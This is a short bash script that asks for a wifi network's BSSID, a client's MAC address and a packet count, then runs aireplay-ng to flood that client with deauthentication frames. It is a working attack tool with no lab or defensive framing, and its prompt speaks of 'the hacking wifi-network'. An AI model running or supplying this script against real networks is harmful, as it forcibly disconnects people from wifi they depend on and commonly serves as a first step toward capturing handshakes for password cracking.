read -p "Enter the bssid of the hacking wifi-network: " bssid
read -p "Enter the mac address of the client to be disconnected: " bssidc
read -p "Enter the number of deauth messages to be transferred: " deauth
sudo aireplay-ng --deauth $deauth -c $bssidc -a $bssid wlan0
